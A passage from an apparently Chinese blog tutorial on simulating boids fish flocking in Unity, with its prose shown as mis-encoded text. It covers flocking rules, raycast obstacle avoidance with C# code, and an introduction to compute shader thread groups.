é€Ÿåº¦éƒ½ä¿å­˜åœ¨å˜é‡é‡Œï¼Œæˆ‘å°±ç…§æ¬ä»–çš„åšæ³•äº†</p><p>ä¸ºäº†åæœŸçš„è°ƒå‚ä¾¿åˆ©ï¼ˆè°ƒå‚çœŸçš„æ˜¯ä¸€ä¸ªå¾ˆéº»çƒ¦çš„äº‹æƒ…ï¼‰ï¼Œæˆ‘å°†æ ¹æ®ä¸‰æ¡è§„åˆ™æ‰€äº§ç”Ÿçš„åŠ é€Ÿåº¦æ†ç»‘ä¸ºä¸€ç§ç±»å‹çš„åŠ é€Ÿåº¦ï¼Œå†å°†è§„é¿éšœç¢ç‰©çš„åŠ é€Ÿåº¦æ†ç»‘ä¸ºå¦ä¸€ç§åŠ é€Ÿåº¦ï¼Œç„¶åå¯¹æ¯ç§ç±»å‹çš„åŠ é€Ÿåº¦åˆ†åˆ«è¿›è¡Œæ›´ç»†è‡´çš„æƒé‡åˆ†é…</p><p>ä¸ºäº†ä¾¿äºç®¡ç†é±¼ç¾¤çš„è¡Œä¸ºï¼Œå°† å¤„ç†å½“å‰çš„é±¼ä¸å…¶ä»–å‰©ä½™çš„é±¼çš„ä»£ç  ä¸ é±¼è‡ªèº«Updateçš„ä»£ç  åˆ†å¼€ç¼–è¾‘æ˜¯å¾ˆé‡è¦çš„ï¼Œä¸ç®¡æ˜¯ç¼–è¾‘çš„ä¾¿åˆ©è¿˜æ˜¯è¿è¡Œçš„æ•ˆç‡ï¼Œæ¯æ¬¡æŸ¥æ‰¾å…¶ä»–é±¼çš„æ—¶å€™éƒ½<code>FindObjectsOfType&lt;Boid&gt;()</code>ä¸€ä¸ªæ–°çš„åˆ—è¡¨æ˜¯å®Œå…¨æ²¡æœ‰å¿…è¦çš„ï¼Œæ‰€ä»¥æŠŠè¿™éƒ¨åˆ†ä¸å…¶ä»–é±¼äº§ç”Ÿè”ç³»çš„ä»£ç æŠ½è±¡ä¸ºä¸€ä¸ª<code>BoidManager</code>ç±»ï¼ŒæŠŠæ›´æ–°è‡ªèº«é€Ÿåº¦ç­‰ä¿¡æ¯çš„ä»£ç æ”¾åœ¨<code>Boid</code>è‡ªå·±çš„ç±»é‡Œé¢ä½œä¸ºæˆå‘˜æ‰æ˜¯åˆç†çš„</p><ul><li><p>å…³é”®å‡½æ•°ï¼š</p><p>  <code>FindObjectsOfType&lt;Boid&gt;()</code>  æŒ‰ç±»æŸ¥æ‰¾</p><p>  <code>Awake() </code> ä¸ <code>Start()</code>  æ³¨æ„<code>Awake</code>æ–¹æ³•æ¯”<code>Start</code>å…ˆæ‰§è¡Œå°±è¡Œ</p></li></ul><img src="/images/Boid_UnityLifeCircle.webp" alt="Boid_UnityLifeCircle" style="zoom: 80%;" /><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><h3 id="Collision-Avoidance"><a href="#Collision-Avoidance" class="headerlink" title="Collision Avoidance"></a>Collision Avoidance</h3><p>å½“å‰å¯¹è±¡ä¸æ¯æ¡é±¼ä½ç½®å‘é‡ä¹‹å·®å³ä¸ºåç§»é‡ï¼Œç”¨åç§»é‡çš„å•ä½å‘é‡é™¤ä»¥åç§»é‡çš„æ¨¡ä»¥è·å¾—ä¸€ä¸ªåŸºäºä½ç½®è¿œè¿‘çš„åŠ é€Ÿåº¦å³å¯</p><center><code>avoidAcceleration -= posOffest.normalized / posOffset.magnitude</code></center><h3 id="Velocity-Matching"><a href="#Velocity-Matching" class="headerlink" title="Velocity Matching"></a>Velocity Matching</h3><p>å½“å‰å¯¹è±¡ä¸æ¯æ¡é±¼æœå‘å‘é‡ä¹‹å·®å³ä¸ºåç§»é‡ï¼Œå› ä¸ºå…¶å®å®é™…è¿è¡Œä¸­é€Ÿåº¦çš„å¤§å°å·®å¼‚ä¸ä¼šå¾ˆå¤§ï¼Œé€Ÿåº¦æ–¹å‘å´ä¼šæœ‰å¾ˆå¤§å·®å¼‚ï¼Œæ‰€ä»¥åªç”¨åŒ¹é…ä¸€ä¸‹æœå‘å³å¯</p><center><code>headingAcceleration += forwardOffest</code></center><h3 id="Flock-Centering"><a href="#Flock-Centering" class="headerlink" title="Flock Centering"></a>Flock Centering</h3><p>è¿™å…¶å®å°±æ˜¯ç¬¬ä¸€æ¡è§„åˆ™å»æ‰è·ç¦»è¿œè¿‘çš„åŠ æƒ</p><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> anoBoidIndex = <span class="number">0</span>; anoBoidIndex &lt; boids.Length; anoBoidIndex++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (boidIndex != anoBoidIndex) &#123;</span><br><span class="line">        Vector3 offest = boids[boidIndex].transform.position - boids[anoBoidIndex].transform.position;</span><br><span class="line">        <span class="built_in">float</span> sqrDis = offest.sqrMagnitude;</span><br><span class="line">        <span class="keyword">if</span> (sqrDis &lt; viewRadius * viewRadius) &#123;</span><br><span class="line">            headingAcceleration += boids[anoBoidIndex].transform.forward - boids[boidIndex].transform.forward;</span><br><span class="line">            centerAcceleration -= offest;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sqrDis &lt; avoidRadius * avoidRadius) avoidAcceleration += offest.normalized / sqrDis;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">boids[boidIndex].acceleration = avoidAcceleration * avoidWeight + headingAcceleration * headingWeight + centerAcceleration * centerWeight;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å¼•å…¥äº†å‡ ä¸ªRadiusä½œä¸ºæ˜¯å¦å½±å“å½“å¯¹è±¡çš„é˜ˆå€¼ä»¥é™åˆ¶é±¼çš„è§†åŠ›èŒƒå›´</p><p>åº”ç”¨äº†ä¸‰ä¸ªè§„åˆ™åå¯ä»¥å¦‚ä¸‹GIFçš„æ•ˆæœ</p><p><img src="/images/Boid_Rules.gif"></p><center><small>ï¼ˆçº¢è‰²çš„é‚£æ¡æ˜¯0å·é±¼(åˆå·æœº)ï¼Œä¸ºçš„æ˜¯ä¾¿äºä»ä¸ªä½“çš„è§†è§’è§‚å¯ŸåŠ¨å‘ï¼‰</small></center><p>æˆ‘åœ¨ä¸€ä¸ªåœ†å†…åœ¨éšæœºçš„ä½ç½®ä»¥éšæœºçš„æœå‘ç”Ÿæˆäº†ä¸€äº›é±¼ï¼Œä¸éš¾å‘ç°ä»–ä»¬å¾ˆå¿«å°±ä¼šæ ¹æ®è‡ªå·±çš„ä½ç½®ä¸æœå‘å½¢æˆå‡ ä¸ªé±¼ç¾¤ï¼Œä½†è¿™äº›é±¼ç¾¤éƒ½ååˆ†ç¨³å®šï¼Œè¿™æ˜¯å› ä¸ºè™½ç„¶ä»–ä»¬å—ç¾¤èšè§„åˆ™çš„é™åˆ¶ï¼Œä½†æ²¡æœ‰ä¸€ä¸ªå¤–åŠ›æ¥ç ´åè¿™ä¸€è§„åˆ™é™åˆ¶å‡ºçš„ç¨³å®šç»“æ„ï¼Œæˆ‘ä»¬æƒ³çœ‹åˆ°çš„å¿…ç„¶ä¸æ˜¯ä¸€ä¸ªç¨³å®šç»“æ„çš„é±¼ç¾¤</p><p>å¯¹äºå¤–åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å¢åŠ ä¸€ä¸ªé©±é€è€…æ¥è¿½èµ¶é±¼ç¾¤ï¼Œç±»ä¼¼äº <a href="www.bilibili.com/video/BV1tq4y1j7TW">è¿™ä¸ªè§†é¢‘</a>ï¼Œä¹Ÿå¯ä»¥å¢åŠ éšœç¢ç‰©æ¥é˜»æŒ¡é±¼ç¾¤ï¼Œåœ¨æ­¤ä¸ºäº†åœºæ™¯çš„å¤šæ ·æ€§ï¼Œæˆ‘é€‰æ‹©åè€…</p><h2 id="Obstacle-Avoidance"><a href="#Obstacle-Avoidance" class="headerlink" title="Obstacle Avoidance"></a>Obstacle Avoidance</h2><p>å…¶å®ä¸Šè¿°çš„é±¼ç¾¤è¡ŒåŠ¨è§„åˆ™éå¸¸ç®€å•ï¼Œä¸ç®¡æ˜¯å­—é¢ä¸Šçœ‹èµ·æ¥è¿˜æ˜¯ä»£ç ä¸Šæ•²èµ·æ¥ï¼Œè¿™ä¹Ÿä½¿å¾—åœ¨ç©ºæ—·ç¯å¢ƒä¸­çš„é±¼ç¾¤çœ‹èµ·æ¥å¾ˆæ²¡æ„æ€ï¼Œæ‰€ä»¥åŠ å…¥ä¸€ä¸ªé¿éšœçš„functionæ¥ä½¿å®ƒæ›´æœ‰è¶£å§</p><p>è¦ä½¿é±¼é¿å¼€å‰æ–¹çš„éšœç¢ç‰©ï¼Œé¦–å…ˆæƒ³åˆ°çš„ä¾¿æ˜¯<code>Physics.Raycast()</code>å°„çº¿æ£€æµ‹ï¼Œä½†æ­¤å‡½æ•°å¯¹CPUè²Œä¼¼ä¸æ€ä¹ˆå‹å¥½ï¼Œå¤§é‡è¿è¡Œæ­¤å‡½æ•°å¡æˆPPTï¼Œè€Œå•ä¸ªçš„å°„çº¿æ£€æµ‹ä¹Ÿæ˜¯æ£€æµ‹åˆ°ç‰©ä½“æ—¶å°±è¿”å›äº†ï¼Œå‡å…·æœ‰æ‰§è¡Œæ—¶é—´å…·æœ‰é«˜åº¦ä¸ç¡®å®šæ€§çš„ç‰¹å¾ï¼Œä¸é€‚å®œä½¿ç”¨ComputeShaderæ¥æé€Ÿï¼Œæ•…å”¯ä¸€çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯å°½å¯èƒ½åœ°å‡å°‘å°„çº¿æ•°é‡</p><p>åœ¨ç¤ºä¾‹å·¥ç¨‹ä¸­ï¼Œè¿™ä½è€å“¥ä½¿ç”¨äº† <a href="https://stackoverflow.com/questions/9600801/evenly-distributing-n-points-on-a-sphere/44164075#44164075">è¿™ç§æ–¹æ³•</a> æ¥ä½¿ç‚¹é˜µåœ¨çƒé¢ä¸Šè¿‘ä¼¼å‡åŒ€åˆ†å¸ƒï¼Œç„¶åå¯¹æ¯ä¸ªç‚¹åšå°„çº¿æ£€æµ‹ï¼Œå¤§è‡´æ˜¯å¯¹é»„é‡‘èºçº¿åšæå¾„å¼€ä¸ªæ ¹å·ï¼Œä½¿å¾—èºçº¿ä¸Šçš„ç‚¹å‡åŒ€æ‘Šå¼€ï¼ŒBEAUTIFUL</p><p><img src="/images/Boid_DIvideSphere1.png"></p><p>è€Œä»åœ†é¢åˆ°çƒé¢ï¼ŒæŠŠæå¾„æ¢æˆÏ†å°±è¿‡æ¥äº†</p><p><img src="/images/Boid_DIvideSphere2.png"></p><p>è¡¨è¾¾å¯èƒ½ä¸å¤ªæ¸…æ¥šï¼Œä½†åªè¦åŠ¨æ‰‹è°ƒä¸€ä¸‹å‚ï¼Œæ¨¡æ‹Ÿä¸€ä¸‹èºçº¿çš„å˜åŒ–å°±å¾ˆæ˜ç™½äº†</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">int</span> numDivide = <span class="number">15</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">const</span> <span class="built_in">float</span> viewAngleRatio = <span class="number">4f</span> / <span class="number">5f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Vector3[] viewVec3;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> numViewDirections = Mathf.CeilToInt(numDivide * viewAngleRatio);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BoidHelper</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    viewVec3 = <span class="keyword">new</span> Vector3[BoidHelper.numDivide];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">float</span> goldenRatio = (<span class="number">1</span> + Mathf.Sqrt(<span class="number">5</span>)) / <span class="number">2f</span>;</span><br><span class="line">    <span class="built_in">float</span> angleIncrement = Mathf.PI * <span class="number">2</span> * goldenRatio;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; numViewDirections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> t = (<span class="built_in">float</span>)i / numDivide;</span><br><span class="line">        <span class="built_in">float</span> inclination = Mathf.Acos(<span class="number">1</span> - <span class="number">2</span> * t);</span><br><span class="line">        <span class="built_in">float</span> azimuth = angleIncrement * i;</span><br><span class="line"></span><br><span class="line">        viewVec3[i].x = Mathf.Sin(inclination) * Mathf.Cos(azimuth);</span><br><span class="line">        viewVec3[i].y = Mathf.Sin(inclination) * Mathf.Sin(azimuth);</span><br><span class="line">        viewVec3[i].z = Mathf.Cos(inclination);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹å·¥ç¨‹ä¸­è¿™ä½è€å“¥åº”è¯¥ä¹Ÿæ˜¯æ€•å°„çº¿å¤ªå¤šå¯¼è‡´å¡é¡¿ï¼Œæ–¹æ¡ˆæ¯”è¾ƒæš´åŠ›ï¼Œå°±æ˜¯ä»å‰æ–¹å¼€å§‹æ£€æµ‹ï¼Œä¸€æ—¦æ£€æµ‹åˆ°ç©ºæ—·å¤„å°±ç›´æ¥åŠ ä¸ªè·ç¦»çš„æƒé‡ç„¶ååº”ç”¨åˆ°åŠ é€Ÿåº¦ä¸Šå¹¶ç›´æ¥<code>break</code>æ‰å¾ªç¯äº†ï¼Œä¹Ÿå°±æ˜¯è¯´é±¼ä¼šæœç€ç¬¬ä¸€ä¸ªæ£€æµ‹åˆ°çš„ç©ºæ—·å¤„æ¸¸å»ã€‚</p><p><img src="/images/Boid_Close2Ground.png"></p><p>è¿™ä¸å…å¯¼è‡´äº†ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯é±¼æœ€åä¼šå’Œéšœç¢ç‰©è¡¨é¢ç›¸åˆ‡ï¼Œç„¶åè´´ç€éšœç¢ç‰©è¡¨é¢ç§»åŠ¨ï¼Œå…ˆä¸è¯´è¿™æ ·ä¼šå¯¼è‡´åœ¨ä¸‹ä¸€æ¬¡å—åˆ°æ‰°åŠ¨æ—¶ç©¿æ¨¡çš„é—®é¢˜ï¼Œè¿™ç§æ¬¾å¼çš„é±¼ç¾¤ç®€ç›´åƒæäº†ä¸€ç¾¤å¤§è€—å­</p><p><img src="/images/Boid_StickToGround.gif"></p><p>æ‰€ä»¥æ—¢ç„¶åœ¨åœºæ™¯ä¸ä¼šå¾ˆå¤æ‚çš„æ—¶å€™ä½¿ç”¨è¿™ä¹ˆå¤šå°„çº¿å±å®æ²¡æœ‰å¿…è¦ï¼Œç»è¿‡å®é™…æµ‹è¯•ï¼Œä½¿ç”¨å‡ æ¡å°„çº¿åˆ†è¾¨ä¾§é¢ç¯å¢ƒå¹¶ä¸”ä¸<code>break</code>å°„çº¿æ£€æµ‹çš„å¾ªç¯ï¼Œä½¿é±¼å……åˆ†è®¤çŸ¥åˆ°å‘¨å›´ç¯å¢ƒï¼Œå°†æ­¤ä¸ä¸Šè¿°ç­‰åˆ†æ£€æµ‹çš„æ–¹æ³•ç»„åˆä¾¿æ˜¯ä¸€ä¸ªæ›´ä¼˜è§£ï¼Œæ­¤å¤„æˆ‘é€‰æ‹©çš„æ˜¯12æ¡å°„çº¿ï¼Œå³xyå¹³é¢ä¸Š60Â°ç­‰åˆ†ï¼Œå†åœ¨Ï†=45Â°çš„åœ†å‘¨ä¸Šä¹Ÿ60Â°ç­‰åˆ†</p><p><img src="/images/Boid_Close2GroundFix.png"></p><p>é¿éšœçš„ç›¸å…³ä»£ç å› ä¸ºä¸æ¶‰åŠå…¶ä»–é±¼ï¼Œé€‰æ‹©æŠŠä»£ç æ”¾åœ¨äº†<code>Boid</code>ç±»ä¸‹ï¼Œä½†è¿™ä¼šå¯¼è‡´è°ƒå‚çš„æ—¶å€™éœ€è¦åœ¨Unityä¸­é¢‘ç¹åˆ‡æ¢Inspectorï¼Œè§£å†³æ–¹æ¡ˆæ˜¯æŠŠå‚æ•°å…¨éƒ¨æ”¾åˆ°ä¸€ä¸ª<code>Setting</code>ç±»ä¸­ï¼Œæ­¤ç±»ç»§æ‰¿<code>ScriptableObject</code>ï¼Œè¿™æ ·ä¸ä»…è§£å†³äº†Inspectorçš„é—®é¢˜ï¼Œè¿˜ä½¿å¾—Prefabåœ¨è¢«æ‹·è´æ—¶é€šè¿‡referenceè®¿é—®æ•°æ®ï¼Œé¿å…äº†å¤šæ¬¡æ‹·è´é€ æˆçš„å†…å­˜æµªè´¹ï¼Œä¹Ÿæå‡äº†åœ¨è¿è¡Œä¸­è°ƒå‚æ—¶çš„æ•´ä½“æ€§ï¼Œè¿è¡Œä¸­è¿›è¡Œçš„è°ƒå‚ä¹Ÿå¾—ä»¥ç›´æ¥ä¿å­˜è€Œä¸ç”¨Copy Component Valuesäº†</p><h3 id="Front"><a href="#Front" class="headerlink" title="Front"></a>Front</h3><p>åœ¨è¿›è¡Œæ­£é¢é¿éšœæ—¶ï¼Œå¦‚æœæä¾›çš„å°„çº¿å°‘äº†åˆ™ä¼šä½¿å¾—é±¼çš„é€Ÿåº¦æ–¹å‘å˜åŒ–è¿‡å¤§ï¼Œä¸å¤Ÿå¹³æ»‘ï¼Œæ‰€ä»¥æ­£é¢é¿éšœç›´æ¥é‡‡ç”¨é»„é‡‘èºæ—‹æ³•åœ¨çƒé¢ä¸Šç­‰è·å–ç‚¹ï¼Œä»æ­£é¢å¼€å§‹éå†è¿™äº›ç‚¹ï¼Œä¸€æ—¦å–åˆ°ä¸€ä¸ªå¯è½¬å‘çš„èŒƒå›´å°±<code>break</code>å³å¯</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vector3 <span class="title">AvoidObstacleDir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; BoidHelper.numViewDirections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Vector3 viewDir = transform.TransformDirection(BoidHelper.viewVec3[i]);</span><br><span class="line">        Ray ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        <span class="keyword">if</span> (!Physics.Raycast(ray, obstacleRadius, obstacleMask)) <span class="keyword">return</span> viewDir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Vector3.zero;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Around"><a href="#Around" class="headerlink" title="Around"></a>Around</h3><p>ç¤ºä¾‹å·¥ç¨‹ä¸­å› ä¸ºç¼ºå°‘äº†å¯¹å‘¨å›´éšœç¢ç‰©çš„æ£€æµ‹ï¼Œå¯¼è‡´äº†å¤§é‡å› ä¸ºè´´è¿‘ç‰©ä½“è¡¨é¢ç§»åŠ¨è€Œç©¿è¿‡Colliderçš„è¡Œä¸ºï¼Œæ‰€ä»¥åœ¨å‘¨å›´åŠ å…¥å°‘é‡çš„<code>Raycast</code>ï¼Œä½¿å¾—é±¼ä¹Ÿä¸ä¼šè¿‡äºé è¿‘å››å‘¨çš„éšœç¢</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Vector3 <span class="title">KeepDstWithObstDir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Vector3 keepDstDir = Vector3.zero;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; circleFrac; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Vector3 viewDir = Vector3.zero;</span><br><span class="line">        <span class="built_in">float</span> angle = i / (<span class="built_in">float</span>)circleFrac * <span class="number">2</span> *Mathf.PI;</span><br><span class="line">        viewDir.x = Mathf.Sin(angle);</span><br><span class="line">        viewDir.y = Mathf.Cos(angle);</span><br><span class="line">        viewDir = transform.TransformDirection(viewDir);</span><br><span class="line">        Ray ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        RaycastHit hit;</span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(ray,<span class="keyword">out</span> hit, keepDstWithObstRadius, obstacleMask)) keepDstDir -= viewDir / hit.distance;</span><br><span class="line">        <span class="comment">// cos(PI/4) is close to 0.7071</span></span><br><span class="line">        <span class="built_in">float</span> angleOffset = <span class="number">1</span> / (<span class="built_in">float</span>)circleFrac * Mathf.PI;</span><br><span class="line">        viewDir.x = Mathf.Sin(angle + angleOffset) * <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir.y = Mathf.Cos(angle + angleOffset) * <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir.z = <span class="number">0.7071f</span>;</span><br><span class="line">        viewDir = transform.TransformDirection(viewDir);</span><br><span class="line">        ray = <span class="keyword">new</span> Ray(transform.position, viewDir);</span><br><span class="line">        <span class="keyword">if</span> (Physics.Raycast(ray,<span class="keyword">out</span> hit, keepDstWithObstRadius, obstacleMask)) keepDstDir -= viewDir / hit.distance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keepDstDir.normalized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h3><p>è‡³æ­¤é±¼ç¾¤çš„æ¨¡æ‹Ÿå·²ç»åŸºæœ¬å®Œæˆï¼Œæ¥ä¸‹æ¥è¦åšçš„ä¾¿æ˜¯å°†<code>Rules</code>éƒ¨åˆ†çš„ä»£ç ç§»æ¤åˆ°ComputeShaderä¸­è®¡ç®—ï¼Œä»¥å‡è½»CPUçš„è´Ÿæ‹…</p><p><img src="/images/Boid_BasicResult.gif"></p><p>é™¤äº†ä½¿ç”¨éšœç¢ç‰©ç ´åé±¼ç¾¤çš„ç¨³å®šç»“æ„ï¼ŒåŠ å…¥æ•é£Ÿè€…ã€é£Ÿç‰©ä¹‹ç±»çš„æœºåˆ¶ä¹Ÿå¯ä»¥ä¸ºé±¼ç¾¤ç³»ç»Ÿå¢æ·»å¤æ‚æ€§ä¸è¶£å‘³æ€§ï¼Œä¸å¦¨è‡ªå·±å°è¯•ä¸€ä¸‹</p><h2 id="Compute-Shader"><a href="#Compute-Shader" class="headerlink" title="Compute Shader"></a>Compute Shader</h2><h3 id="WTF-is-this"><a href="#WTF-is-this" class="headerlink" title="WTF is this"></a>WTF is this</h3><p>ä¸å¦¨ä½¿ç”¨æ–‡æ¡£ä¸­çš„ç¤ºä¾‹æ¥è§£é‡Šä¸€ä¸‹ComputeShaderï¼Œä¸‹é¢è¿™ä¸ªComputeShaderå°†ä¸€ä¸ªæè´¨æ¶‚çº¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#pragma kernel FillWithRed</span><br><span class="line">RWTexture2D&lt;float4&gt; res;</span><br><span class="line">[numthreads(1,1,1)]</span><br><span class="line">void FillWithRed (uint3 dtid : SV_DispatchThreadID)</span><br><span class="line">&#123;</span><br><span class="line">    res[dtid.xy] &#x3D; float4(1,0,0,1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§ComputeShaderä½¿ç”¨<code>HLSL</code>è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯<code>High Level Shader Language</code>ï¼Œå› ä¸ºé€šå¸¸åªæ˜¯æ‹¿æ¥åšæ•°å­¦è®¡ç®—ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šåªè¦è£…ä¸€ä¸ªhlslçš„ä»£ç æç¤ºçš„extensionå°±å¯ä»¥ç›´æ¥å¼€å§‹å†™äº†</p><p><code>#pragma kernel FillWithRed</code>ï¼šé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªæ ¸å‡½æ•°ï¼Œå‡½æ•°åé»˜è®¤æ˜¯CSMainï¼Œè¿™æ˜¯compute shaderçš„å‡½æ•°å…¥å£ï¼Œä½ ä¹Ÿå¯ä»¥å®šä¹‰å¤šä¸ªå…¥å£ï¼Œå› ä¸ºæœ¬å·¥ç¨‹åªéœ€è¦ä¸€ä¸ªå…¥å£ï¼Œå¤šä¸ªå…¥å£çš„ComputeShaderæš‚æ—¶æ²¡æœ‰å¤šåšäº†è§£</p><p><code>[numthreads(1,1,1)]</code>ï¼šè§„å®šäº†ä½¿ç”¨çš„çº¿ç¨‹ç»„å¤§å°ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯å•çº¿ç¨‹ï¼Œé»˜è®¤æ˜¯<code>(8,8,1)</code>ï¼Œçº¿ç¨‹æ•°é‡ä¸º<code>8x8x1</code>ï¼Œä¹Ÿå°±æ˜¯64çº¿ç¨‹ä½œä¸ºä¸€ä¸ªçº¿ç¨‹ç»„ã€‚<a href="https://blog.csdn.net/weixin_38884324/article/details/80570160">æ›´å¤šåœ°äº†è§£numthreads</a> ä¼šå‘ç°é‡Œé¢ä¸œè¥¿æŒºå¤šï¼Œæ¶‰åŠåˆ°æ˜¾å¡çš„ç¡¬ä»¶</p><img src="/images/Boid_ThreadGroup.png" alt="Boid_ThreadGroup" style="zoom:50%;" /><p>å¦‚ä¸Šå›¾ï¼Œ<code>numthreads</code>è§„å®šäº†ä¸€ä¸ªGroup(çº¿ç¨‹ç»„)ä¸­çš„çº¿ç¨‹æ•°é‡ï¼Œ<code>Dispatch()</code>ä½œä¸ºC#è„šæœ¬è°ƒç”¨ComputeShaderçš„äº¤äº’æ–¹å¼ï¼Œä¸<code>numthread</code>æœ‰ä¸€äº›è”ç³»ï¼Œåœ¨ä»‹ç»å®ŒUnityçš„å®˜æ–¹ComputeShaderç¤ºä¾‹åä¼šæåˆ°ã€‚è‡³äºä¸ºä»€ä¹ˆå¤§å°ç”±ä¸€ä¸ªä¸‰ç»´æ•°ç»„ç¡®å®šï¼Œæ˜¯ä¸ºäº†åœ¨è®¿é—®2Dæˆ–è€…3Dçš„æ•°æ®ç»“æ„çš„æ—¶å€™æ›´åŠ æ–¹ä¾¿æ“ä½œ(å¤§æ¦‚æ˜¯å§)</p><blockquote><p>The ability to specify the size of the thread group across three dimensions allows individual threads to be accessed in a manner that logically 2D and 3D data structures</p><p align="right"><a herf="https://docs.microsoft.com/en-us/windows/win32/direct3dhlsl/sm5-attributes-numthreads">--Microsoft Doc</a></p></blockquote><p>åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸€èˆ¬ä¸ä¼šä½¿<code>numthreads</code>å°äº32ï¼Œè¿™ä¼šè¾¾ä¸åˆ°æœ€ä½çº¿ç¨‹æ•°å¯¼è‡´å¤šæ ¸å›´è§‚ï¼›ä½†ä¹Ÿä¸èƒ½è¶…è¿‡1024ï¼Œåº”è¯¥ä¹Ÿæ˜¯ç¡¬ä»¶å±‚é¢çš„é™åˆ¶ã€‚æ ¹æ®ä¹‹å‰æåˆ°çš„CSDNä¸Šçš„å»ºè®®ï¼š</p><blockquote><p>AMDï¼šThreadSize ä½¿ç”¨ 64 çš„å€æ•¸ ( wavefront æ¶æ§‹ )<br>NVIDIAï¼šThreadSize ä½¿ç”¨ 32 çš„å€æ•¸ ( SIMD32 (Warp) æ¶æ§‹ )</p></blockquote><p>è¿™ä¹ˆä¸€çœ‹å®˜æ–¹åˆå§‹çº¿ç¨‹æ•°é€‰æ‹©64è¿˜æŒºåˆç†çš„ï¼Œä½†æˆ‘ä»¬ä»ç„¶éœ€è¦æ ¹æ®è‡ªå·±çš„å®é™…éœ€æ±‚ä»¥åŠé¢„æœŸçš„çº¿ç¨‹ç»„æ•°æ¥é€‰æ‹©å…·ä½“çš„<code>numthread</code></p><p><code>ID</code>ï¼šåœ¨å£°æ˜æ–¹æ³•æ—¶æåˆ°äº†<code>ID</code>çš„æ¦‚å¿µï¼Œå³<code>void FillWithRed (uint3 dtid : 